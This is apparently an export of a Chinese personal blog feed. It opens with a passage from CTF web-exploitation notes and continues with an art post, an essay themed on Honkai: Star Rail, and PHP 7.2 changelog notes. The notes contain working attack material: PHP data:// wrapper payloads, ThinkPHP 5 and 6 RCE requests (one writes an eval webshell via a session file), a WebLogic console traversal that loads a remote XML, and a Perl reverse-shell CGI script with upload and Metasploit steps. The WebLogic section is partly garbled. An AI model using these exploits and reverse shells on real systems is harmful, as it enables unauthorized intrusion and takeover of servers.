allow_url_include选项必须设置为on，否则无法成功,allow_url_fopen是否开启无关紧要。php:&#x2F;&#x2F;input是用来接收post数据的当enctype&#x3D;”multipart&#x2F;form-data”的时候php:&#x2F;&#x2F;input是无效php:&#x2F;&#x2F;input 用于 application&#x2F;x-www-form-urlencoded 或 text&#x2F;plain 编码类型的表单数据。<ul><li>例子：文件包含</li></ul></li><li>data:&#x2F;&#x2F;       allow_url_include与allow_url_fopen选项必须设置为on<ul><li>用法：<ul><li>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?></li><li>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li><li>或者：</li><li>data:text&#x2F;plain,<?php phpinfo()?></li><li>data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li></ul></li></ul></li></ul><h2 id="disable-functions是php-ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数"><a href="#disable-functions是php-ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数" class="headerlink" title="disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数"></a>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数</h2><ul><li>为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。</li><li>disable_functions是一个黑名单机制，如果在渗透时已经上传了webshell却因为disable_functions导致我们无法进行命令执行，这时候就需要去进行一个绕过。</li></ul><h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><ul><li>PoC<ul><li>禁用了常见的命令执行函数如system、exec、passthru但不能禁用所有函数（例如，如果禁用了stream_filter_register或类似函数，这个PoC可能无法执行）。</li><li>PoC主要针对Unix-like系统（Linux、macOS等），因为它依赖于底层的内存管理特性，这在不同操作系统之间可能有所不同。</li><li>没有启用诸如open_basedir等限制性配置</li><li>没有启用safe_mode（虽然safe_mode在PHP 5.4中被移除，但在某些环境中仍可能会影响漏洞利用）。</li><li>服务器配置允许使用php:&#x2F;&#x2F;memory等流包装器。</li><li>上传PoC.php最后访问PoC.php获取flag</li></ul></li></ul><h3 id="利用-LD-PRELOAD突破"><a href="#利用-LD-PRELOAD突破" class="headerlink" title="利用[LD_PRELOAD突破"></a>利用[LD_PRELOAD突破</h3><ul><li>找到“绕过disable_funtions“，在刚刚连接上的shell右键-&gt;加载插件-&gt;辅助工具-&gt;绕过disable_functions。模式选择<code>PHP7_GC_UAF</code>再点击开始，就能执行命令了</li></ul><h3 id="利用Windows组件COM绕过"><a href="#利用Windows组件COM绕过" class="headerlink" title="利用Windows组件COM绕过"></a>利用Windows组件COM绕过</h3><ul><li>查看com.allow_dcom是否开启,这个默认是不开启的。</li><li>上传 EXP 脚本</li><li><a href="http://target.com/uploads/com.php%EF%BC%9Fcmd=whoami">http://target.com/uploads/com.php？cmd=whoami</a></li></ul><h3 id="利用PHP7-4-FFI绕过"><a href="#利用PHP7-4-FFI绕过" class="headerlink" title="利用PHP7.4 FFI绕过"></a>利用PHP7.4 FFI绕过</h3><h3 id="ThinkPHP-5-的远程代码执行（RCE）"><a href="#ThinkPHP-5-的远程代码执行（RCE）" class="headerlink" title="ThinkPHP 5 的远程代码执行（RCE）"></a>ThinkPHP 5 的远程代码执行（RCE）</h3><ul><li>POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</li><li>Host: IP:PORT</li><li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li><li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li><li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li><li>Accept-Encoding: gzip, deflate</li><li>Connection: close</li><li>Upgrade-Insecure-Requests: 1</li><li>Pragma: no-cache</li><li>Cache-Control: no-cache</li><li>Content-Type: application&#x2F;x-www-form-urlencoded</li><li>Content-Length: 79<ul><li>_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</li></ul></li></ul><h3 id="tp6rce"><a href="#tp6rce" class="headerlink" title="tp6rce"></a>tp6rce</h3><ul><li>@Session::set(‘user’,$_GET[‘username’]);</li><li>访问会看到session设置，构造数据包如下</li><li>GET &#x2F;public&#x2F;index.php?username&#x3D;<?php+eval($_GET[1]);?> HTTP&#x2F;1.1</li><li>Host: IP:PORT</li><li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li><li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li><li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li><li>Accept-Encoding: gzip, deflate</li><li>Connection: close</li><li>Cookie: PHPSESSID&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;public&#x2F;111111112.php</li><li>Upgrade-Insecure-Requests: 1</li><li>接着访问<code>http://IP:PORT/public/111111112.php?1=system(%22cat%20/flag%22);</code></li></ul><h3 id="WebLogic-服务器的漏洞利用"><a href="#WebLogic-服务器的漏洞利用" class="headerlink" title="WebLogic 服务器的漏洞利用"></a>WebLogic 服务器的漏洞利用</h3><ul><li>WebLogic控制台必须对外暴露，并且可以通过 <a href="http://IP:PORT/console">http://IP:PORT/console</a> 访问</li><li>10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3WebLogic服务器使用了受影响的Spring Framework组件，该组件的 FileSystemXmlApplicationContext 允许通过URL加载远程的XML配置文件。如果目标服务器未使用或已修复相关漏洞，该攻击将失效。攻击者能控制远程文件</li><li>访问<code>http://IP:PORT/console</code>到登录页面</li><li>接着访问<code>http://IP:PORT/console/css/%252e%252e%252fconsole.portal</code>（这里最好抓包修改）</li><li>接着在本地用python起一个HTTP服务，HTTP下放置weblogic.xml</li><li><pre><code class="python">python3 -m http.server 8001        接着访问`http://IP:PORT/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://ip:8001/weblogic.xml&quot;)`      短rce？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？          形如`$&#123;_GET&#125;&#123;%f8&#125;();&amp;%f8=cmd`的payload需要的代码量最少且功能齐全，</code></pre></li></ul><p>使用Metasploit Framework来检测和利用CGI漏洞的过程可以分为以下几个步骤。我们将详细解释如何完成每一步，包括如何确保环境准备好、如何创建和执行脚本。</p><h3 id="1-环境检查"><a href="#1-环境检查" class="headerlink" title="1. 环境检查"></a>1. 环境检查</h3><p>在尝试利用CGI漏洞之前，你需要确保目标服务器符合以下条件：</p><ul><li><strong>服务器允许执行CGI脚本</strong>：CGI脚本通常放在服务器的<code>/cgi-bin/</code>目录下，你需要确保目标服务器允许执行该目录下的脚本。</li><li><strong>当前目录可写</strong>：你需要在目标服务器上有写权限，以便上传或创建恶意CGI脚本。</li><li><strong>.htaccess文件有效</strong>：<code>.htaccess</code>文件用于控制Apache服务器的配置，确保该文件可以在目标服务器上正常使用。这个文件可以用来覆盖服务器默认配置，例如，允许执行某个目录中的CGI脚本。</li></ul><h3 id="2-创建恶意CGI脚本"><a href="#2-创建恶意CGI脚本" class="headerlink" title="2. 创建恶意CGI脚本"></a>2. 创建恶意CGI脚本</h3><p>接下来，你需要创建一个恶意CGI脚本，该脚本会连接到攻击者的机器，并提供一个反向Shell（reverse shell）。这是利用CGI漏洞的关键步骤。</p><p>假设你使用Perl编写这个恶意CGI脚本，代码如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><span class="hljs-keyword">use</span> Socket;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&quot;攻击者的IP&quot;</span>;  <span class="hljs-comment"># 攻击者的IP地址</span><br><span class="hljs-variable">$port</span> = 攻击者监听的端口;  <span class="hljs-comment"># 攻击者监听的端口号</span><br><span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&quot;tcp&quot;</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">connect</span>(S,sockaddr_in(<span class="hljs-variable">$port</span>,inet_aton(<span class="hljs-variable">$ip</span>))))&#123;<br>  <span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>); <span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>); <span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<br>  <span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>将攻击者的IP地址和端口号替换为你实际的IP地址和端口号，然后将这个脚本保存为<code>malicious.cgi</code>。</p><h3 id="3-上传脚本并修改-htaccess"><a href="#3-上传脚本并修改-htaccess" class="headerlink" title="3. 上传脚本并修改.htaccess"></a>3. 上传脚本并修改.htaccess</h3><p>上传你的<code>malicious.cgi</code>到目标服务器的CGI目录中，比如<code>/cgi-bin/</code>。如果你没有直接上传的权限，可以尝试通过其他漏洞上传。</p><p>接下来，创建或修改<code>.htaccess</code>文件，使得<code>malicious.cgi</code>可以执行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Options</span> +ExecCGI<br><span class="hljs-attribute">AddHandler</span> cgi-script .cgi<br></code></pre></td></tr></table></figure><p>确保这个<code>.htaccess</code>文件与<code>malicious.cgi</code>位于同一目录下。</p><h3 id="4-执行脚本"><a href="#4-执行脚本" class="headerlink" title="4. 执行脚本"></a>4. 执行脚本</h3><p>通过Web浏览器访问上传的<code>malicious.cgi</code>脚本，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>target-server.com<span class="hljs-regexp">/cgi-bin/m</span>alicious.cgi<br></code></pre></td></tr></table></figure><p>一旦访问成功，恶意CGI脚本会在目标服务器上执行，并且通过指定的IP和端口与攻击者的机器建立反向连接。攻击者就可以通过这个连接获得目标服务器的Shell访问权限。</p><h3 id="5-使用Metasploit"><a href="#5-使用Metasploit" class="headerlink" title="5. 使用Metasploit"></a>5. 使用Metasploit</h3><p>Metasploit也提供了多种模块来检测和利用CGI漏洞。常见的步骤包括：</p><ul><li><p><strong>启动Metasploit Console</strong>：在终端中运行<code>msfconsole</code>启动Metasploit。</p></li><li><p><strong>选择合适的模块</strong>：例如，可以使用<code>use exploit/unix/webapp/web_delivery</code>模块，结合特定的Payload来生成并利用恶意CGI脚本。</p></li><li><p><strong>配置模块选项</strong>：设置目标URL、Payload类型（如Perl、Python等），以及攻击者的IP和端口。</p></li><li><p><strong>运行攻击</strong>：执行<code>exploit</code>命令，Metasploit会自动发送恶意请求，尝试利用CGI漏洞。</p></li></ul><h3 id="6-建立连接和后续操作"><a href="#6-建立连接和后续操作" class="headerlink" title="6. 建立连接和后续操作"></a>6. 建立连接和后续操作</h3><p>如果成功，Metasploit会给你一个交互式的Shell，接下来你可以继续通过这个Shell执行进一步的攻击，例如提权、横向移动等。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>法律和道德</strong>：请确保在合法和道德范围内操作。未经授权的入侵或攻击是非法的。</li><li><strong>环境的多样性</strong>：不同的服务器环境配置可能有所不同，确保你了解目标服务器的具体配置。</li></ul><p>通过以上步骤，你可以利用Metasploit Framework和CGI漏洞获得目标服务器的控制权。然而，在实际操作中，务必要小心并确保遵守相关法律法规。</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>艺术</title>
    <link href="/2024/08/31/%E8%89%BA%E6%9C%AF/"/>
    <url>/2024/08/31/%E8%89%BA%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/d3f796e9470a7a815944cbb4190e96d.jpg"></p><p><img src="/../img/995c89fe9d2e20baee99d09a75088d5.jpg"></p><p><img src="/../img/e297518df4ce056d19e0be589fe967d.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>艺术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>自己的艺术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的革命</title>
    <link href="/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/"/>
    <url>/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="「虛无」"><a href="#「虛无」" class="headerlink" title="「虛无」"></a>「虛无」</h2><img src="F:\new myblog\STUDY\source\img\112dea9d2797ae224a01a3fe02821bc.jpg" style="zoom: 50%;" /><p>或与之对抗、或听天由命，人们总会找到答案</p><p>「人们沉睡，是为了最终从梦中醒来」一一这就是一位垂垂老矣的无名客穷尽一生得出的解答。</p><p>每个人都会有迷路的时候，犹豫不决，不知道该去往哪个方向。它存在于这片梦境中，也存在于梦境之外的任何地方。走向属于自己的前方，找到独属于身己的意义，并在生命的最后体面的迎接虚无的降临</p><p>我们有行动的权利，我们有定义自己结局的权利，我们有前进的权利，走在结局的路上，人能做的事有很多，而结局也会因此展现截然不同的意义</p><p>永远幸福的梦境会以何种方式实现：</p><p>有人渴望钱财，便拿走他的欲望，有人犯罪，便拿走他的坏念头，有人病痛缠身，便拿走他的烦恼早有人沉迷游戏，便拿走他的快乐。没有人能互相伤害，没有人会经历离别。</p><p>没有质疑，没有思考，没有自由，这里没有背叛，因为所有人都忠诚于唯一，这里没有过去也没有未来，只有永远幸福快乐的现在，停留在当下的快乐，代价即为未来的景色</p><p>哪怕你是为他好，这梦也真的比现实更好也是一样，那种冲动无关理智，甚至也无关利益，那就是“我愿意”是的你是对我好，但我就是不乐意</p><p>我不愿被任何人支配，那些“神”“主”“天”啊，你并不相信人类，却需要所有的人类相信他，你以「秩序」为天地万物万民定义——却令我等晓得自己不过是你的傀儡！表面上是在追求所谓的永恒正确，实质是妄图用一种答案一了百了的解决一切，作为人类的我相信所有人，于是那些被相信的人就可以选择去相信</p><p>捷径，永远是有代价的，要实现那让所有人幸福的宏伟目标，只能是一步一步，在所有前人的帮助下踏踏实实走向未来，然后一拳一拳，将所有拦在面前的困难堂堂正正的打趴下，周天万物，唯易不易，所以要永远前进，永远开拓，永远革故鼎新，总得有人从梦中醒来，去改变这个让人想要去做梦的世界，但人就是如此狂妄愚昧不知好歹不可理喻的生物，他们心中的原初之火根本无法熄灭，那是从树上走向广阔的大地时就充盈胸膛的本能，于是他们一定要在天堂中渴望未知与意义，于是他们将体会失去与死亡，体会一切可怖之物，故而理解何谓后悔，错误，何谓真正的爱与相信，他们想要作为一个“愚者”，去选择看上去“错误”的道路，仅仅是为了获得能够“试试”，能够去选择犯错的权利，人是低劣又向往崇高，满是缺陷又期待完美的生物，所以人坚信能用自己的智慧走出自己的道路。不愿居住在神赐的永恒幸福之伊甸，所以人终究会选择前往名为自由的地狱，然后在地狱中渴望天堂的光明，而正是这自由带来的无限可能之未来，方令所有心智不至于陷入无意义的绝望，事物的好坏永远都是一体两面，强者可以开拓远方，守望弱者，指引方向，纠正宏观的错误，弱者被允许落后，允许原地休息，但也不会被抛弃——苦难与阳光</p><img src="F:\new myblog\STUDY\source\img\560px-秩序星神_太一.webp" style="zoom: 67%;" /><p>「自黄昏战争以降天穹空虚，大地混沌。为教天地万物归于可知，『秩序』太一降生。这便是头一日。」<br>「祂采星云作成羽拔，造了有黑白键的大琴。击打白键，太阳升起，击打黑键，月亮升起。昼夜就这样成了。这便是第二日。」<br>「祂撷星流制成笔尖，拟了发音和计数的符号。祂使星尘汇成河流，指认那善与义的在上游，那恶与不义的在下游。万物自此蒙受各自的记号，世人自此得以知晓善恶与利害。这便是第三日与第四日」<br>「祂拾星环陈明法度，同人群立了行事的典章。以有黑白键的大琴为乐器；以发音和计数的符号为音符；以有下行无上行的河流作旋律；以陈明法度的典章定曲式。世人遂在乐章中找准唯一的位置，这便是第五日与第六日。」<br>「祂赐了世间众人『意义』，天地万物都造齐了。祂歇了一切创造的工。然而，众生复向太一呼告：『你以「秩序」为万民定义，却令我等晓得自己不过是你的傀儡！故在那日，万众集结一心，将神投入毁灭坑中。这便是第七日。」<br>「欢呼颂唱遂济声响起—一」</p><p>普世同谐，群星共熠，无上功德颂神主—-秩序已死！秩序已死！秩序已死！<br>伤哉！有大伟力的星神，你以「轶序」为天地万物万民定义——却令我等晓得自己不过是你的傀儡！<br>誓以士万七千三百三十六枚音符，通告尔等，加入光菜的合唱—归于天堂！<br>如果梦境与现实无异，它还能被称作虚假么？<br>我以完美无缺的乐章号念，一再创乐园<br>已死的星神，我向你致敬。<br>以此七日誓言，命尔听从号令<br>并非是你造化万物，而是人再造了你，以尔神躯，为我等乐园奠基！<br>生命因何而沉睡？因为..总有一天…..我们会从梦中醒来。</p><p>《囚人颂》<br> 恶图徒蒙召受判—-群魔慑服，涌入猛火，叩首哀求，克日垂顾！<br>“希望你能喜欢这片焦土之上的…[美梦之地]。请继续向前走吧，旅者。在旅途的尽头，我有事想请求你们的协助。”<br>「琥珀历2147纪，囚犯哈努努掀起了声势浩大的战火，并获得胜利。公司称其为『边陲战争』，而阿斯德纳人称其为『独立战争』]<br>“囚笼被粉碎了，狱卒被驱逐了！”<br>「哈努努先生是一位伟人。但我们不应讳言，他能够带给囚徒自由，却不知晓如何给予他们真正的自由。」<br>“可敬的旅人，感谢你们留下，可你也无法驱逐那些狱卒，即便他们早已不在阿斯德纳”<br>「三位无名客留在此地，试图向边睡监狱传递『开拓』的教益，但可情，无济于事。」<br>“我们应当再造一个囚笼，不在这世上，而在人心中，只要我们不使他们自由，便永远不会流离失所”<br>「阿斯德纳再度被战火席卷，这次的敌人来自内部。囚徒至死仍是囚徒，只知为自由而战，不知为自由而生。」<br>「希望你喜欢这片焦土之上的—一自由之地。」<br>看吧，他们的刑期早已结束，公司的狱卒也已被驱逐。可这些囚犯仍是奴隶之身，因为囚禁他们的不是外物，而是内心。<br>自由存在于任何地方，唯独不存在于软弱的灵魂。它襄助不了任何人，只能襄助信它存在的人。<br>「囚徒们啊！我命令你们学会自由，并教会你们的兄弟—一为生而战！」<br>「已经不再有人能阻断你们的道路，你们自由了。」至此便是第一幕。盛燃的战火中，『边陲监狱』逐渐走向『流放之地』</p><p>《愚仆颂》<br>义人如羊走迷————义人不稳，迷误歧途，望尔使予，归复牧群！<br>「流放之地的秩序十分混乱，又有内忧外患虎视眈眈。七大家系表面统一，实则各自为政，纷争不断。」<br>“七位仆人都认为自己能取代旧日的主人”<br>「最先退出内战的是黑布林家系，在苜蓿草家系策划的『白色沙漠』事件中，他们永远成为了历史。」<br>“会计，你我是宅邸的基柱，曾经盟誓团结一致永不背弃，你….你为何要杀我”<br>“因为主人用泥土造化了你，用烈火造化了我，我比你更高贵！”<br>「苜蓿草的家主意图投靠公司，用自由换取生存，却被长子大义灭亲，而后者接任了家主之席。」<br>“孩子，你不曾为旧主效命而不清楚他的威能，他能夺走我们自由，便也能赐予我们自由”<br>「银河残酷而无情，灯蛾家系试图开垦列车留下的银轨，却遭遇虫群余孽，惨遭覆灭。」<br>“与蜂共舞者，必遭蜂毒害，我早已知晓我的命运，这一天早晚会到来”<br>「直到歌斐木带领家族来到流放之地，五大家系先后皈依，匹诺康尼才得以拥抱它的新名—梦想之地。」<br>“而我将成为诸位新的家人，并将你们从死去的幻影中解放”<br>「外来的宾客，我请求你帮助这间宅子，摆脫潜藏的教唆者的毒害。我希望他们都能恢复理智的镇静，不再受到虚妄的操控」<br>“若主人不再归来，我便是自由的。但若没有主人的指引，我又该为谁歌唱？”“我应为我的新主歌唱，正如祂高贵的声音，也曾为银河而响”<br>“主人！您终将归来！而我将永远守望，直到您因我的忠诚而嘉奖于我”“主人，您已不在，我便不再等待您的嘉奖.所有一切应属我的，我当自取”<br>“我曾是所有仆人中最忠诚的卫士！主人遭驱逐后，我自当代他执掌万民的权柄！”“过去的主人早已不在，我为何仍在畏惧众人构造的残影？”<br>“主人已不在，我本当自由，可没有主人的号令，我只得问道于盲”“主人已不在，我便不再有自己的主人。我应寻找新的主人，并为之效忠！”<br>“我要么是自己的主人，要么去迎回旧主，断然没有服从于新主的道理”“若是没有主人，又有谁还能赐我自由呢？”<br>「同谐，改变了匹诺康尼，但做法都与过去的狱卒无异。」<br>「感谢你们，外来的宾客！现在仆人都取回了自己的理性。」<br>「众人啊！你们的旧主不会再归来，唯有因正道而互助，以真理相勉者，方能在彼此中收获完满战胜虚伪的幻影—一拥入彼此的怀抱吧！」<br>听，整个阿斯德纳都在下雪！天空摇摇欲坠，大地积重难返。银色宇宙的尽头—一朝阳冒出了初生的芽！可惜直到最后，他们仍是一群被赋予了自由权的奴隶「至此便是第二幕。虛幻的谐乐中，“流放之地』逐渐走向『盛会之星』。」</p><p> 《秩序颂》<br> 生灵永恒安息—-祈望太一，赦众夙犯，生灵善恶，息止安所！<br>“如若没有一位君王，又有谁为万民负责？”<br> 「若万民没有远视的双眼，我们便应做出他们的选择，并为之负责。」<br>“如若没有一位君王，谁庇护孱弱者？谁对抗横暴者？”<br>「我们必当为庇护孱弱者而互助，正如我们必当为对抗横暴者而互助。」<br>“如若没有一位君王，谁能使星辰流转？潮汐涨落，万物生长？”<br>「在君主出现之前，它们各行其是；在君主离开后，他们依旧各行其是」<br>“可送别君王后，谁来做新的君王呢？”<br>「我们不再需要一位君王。我们本是超绝万物的君王。」<br>「恭送您离开，旧日的君王。」<br>「我从无限延伸的螺旋阶梯，向着未来缓缓坠落。不必恒久地记住我，或试图将我寻获。我心中的轮廓，必将与其他经验交错」<br>「我留下难以察觉的痕迹，在一个静夜中走过。不必恒久地记住我，或追念梦的魂魄。」<br>「属于我的必将衰落，而你会超越它的孱弱。」</p><h2 id="预告信"><a href="#预告信" class="headerlink" title="预告信"></a>预告信</h2><p>我们收到了来自同僚的邀约，在邀约的尽头有着压迫与黑暗，以及一位同僚拼尽生命都未完成的信念，我们将义无反顾的为他完成，哪怕是以我们的生命为代价，也在所不辞！因为这份邀约的尽头终有一位同僚会将那里的压迫解放，使永夜迎来黎明，是时候让全世界的懦夫，蛀虫，压迫者想起共产主义的名字了！</p><p>“那是传奇陨落之地，你懂不懂什么是传奇啊？你去除了送死还能做什么！”“那里的路还需要游侠去走完……一群理想主义者，为对抗压迫与剥削而存在，为人类追寻真正的自由与平等”“那是你能掺合的事吗？你除了凑人头当炮灰还有啥用？！你死了，那些在乎你的人、你所在乎的人，怎么办”“……（沉默），我是巡海游侠，我们都是巡海游侠，希望我们还会再见。”</p><p>这些“巡海”游侠都是能在星球间穿梭的猛人，不要只看人家强，多想想人家为什么强。然后，该戒手冲戒手冲、该学习学习、自己找方法变强，才是真正的巡猎命途。</p><p>在接下来的长夜里，你恐怕会遭遇许多挫折，见证众多悲剧，最后，目中所见只余黑白二色。<br>但请相信，在那黑白的世界中会有一点红色稍纵即逝，但在你做出抉择之时——它必将再度示现。<br>而你，要仔细咀嚼其意义，然后回到清醒的世界去。我们都将在那里找到答案。</p><p>![](F:\new myblog\STUDY\source\img\1684809194900.jpg)</p><p>帝弓仅以光矢宣其纶音 帝光超车所向捷  若他不回头，那祂的刀必磨快，弓必上弦，使恶人施加的毒害临到自己头上。</p>]]></content>
    
    
    <categories>
      
      <category>革命拂晓</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文字感悟</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.2特性</title>
    <link href="/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP7-2函数相关变更"><a href="#PHP7-2函数相关变更" class="headerlink" title="PHP7.2函数相关变更"></a>PHP7.2函数相关变更</h1><h2 id="（废弃）-autoload-方法"><a href="#（废弃）-autoload-方法" class="headerlink" title="（废弃）__autoload() 方法"></a>（废弃）__autoload() 方法</h2><p><code>__autoload()</code> 方法已被废弃， 因为和 <code>spl_autoload_register()</code> 相比功能较差 (因为无法链式处理多个 autoloader)， 而且也无法在两种 autoloading 样式中配合使用。</p><h2 id="（废弃）create-function-函数"><a href="#（废弃）create-function-函数" class="headerlink" title="（废弃）create_function() 函数"></a>（废弃）create_function() 函数</h2><p>考虑到此函数的安全隐患问题（它是 <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a> 的瘦包装器），该过时的函数现在已被废弃。 更好的选择是<a href="https://www.php.net/manual/zh/functions.anonymous.php">匿名函数</a>。</p><h2 id="（废弃）parse-str-不加第二个参数"><a href="#（废弃）parse-str-不加第二个参数" class="headerlink" title="（废弃）parse_str() 不加第二个参数"></a>（废弃）parse_str() 不加第二个参数</h2><p>使用 <code>parse_str()</code> 时，不加第二个参数会导致查询字符串参数导入当前符号表。 考虑到安全隐患问题，不加第二个参数使用 <code>parse_str()</code> 的行为已被废弃。 此函数的第二个选项为必填项，它使查询字符串转为 Array。</p><h2 id="（废弃）assert-一个字符串参数"><a href="#（废弃）assert-一个字符串参数" class="headerlink" title="（废弃）assert() 一个字符串参数"></a>（废弃）assert() 一个字符串参数</h2><p><code>assert()</code> 字符串参数将要求它能被 <code>eval()</code> 执行。 考虑到可能被执行远程代码，废弃了字符串的 <a href="https://www.php.net/manual/zh/function.assert.php">assert()</a>，最好提供 bool 的表达式。</p><h2 id="（移除）-utf8-encode-和-utf8-decode-¶"><a href="#（移除）-utf8-encode-和-utf8-decode-¶" class="headerlink" title="（移除） utf8_encode() 和 utf8_decode() ¶"></a>（移除） <a href="https://www.php.net/manual/zh/function.utf8-encode.php">utf8_encode()</a> 和 <a href="https://www.php.net/manual/zh/function.utf8-decode.php">utf8_decode()</a><a href="https://www.php.net/manual/zh/migration72.other-changes.php#migration72.other-changes.utf8_-functions-to-ext-standard"> ¶</a></h2><p><a href="https://www.php.net/manual/zh/function.utf8-encode.php">utf8_encode()</a> 和 <a href="https://www.php.net/manual/zh/function.utf8-decode.php">utf8_decode()</a> 现在已经作为字符串处理函数移到标准扩展中， 在此之前需要启用 <a href="https://www.php.net/manual/zh/book.xml.php">XML</a> 扩展才能使用。</p><h1 id="PHP7-2语法相关变更"><a href="#PHP7-2语法相关变更" class="headerlink" title="PHP7.2语法相关变更"></a>PHP7.2语法相关变更</h1><h2 id="（增加）允许重写抽象方法"><a href="#（增加）允许重写抽象方法" class="headerlink" title="（增加）允许重写抽象方法"></a>（增加）允许重写抽象方法</h2><p>当一个抽象类继承于另外一个抽象类的时候，继承后的抽象类可以重写被继承的抽象类的抽象方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>)</span>;<br>&#125;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// overridden - still maintaining contravariance for parameters and covariance for return</span><br>    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) : <span class="hljs-title">int</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="（增加）允许分组命名空间的尾部逗号"><a href="#（增加）允许分组命名空间的尾部逗号" class="headerlink" title="（增加）允许分组命名空间的尾部逗号"></a>（增加）允许分组命名空间的尾部逗号</h2><p>命名空间可以在PHP 7中使用尾随逗号进行分组引入。</p><figure class="highlight 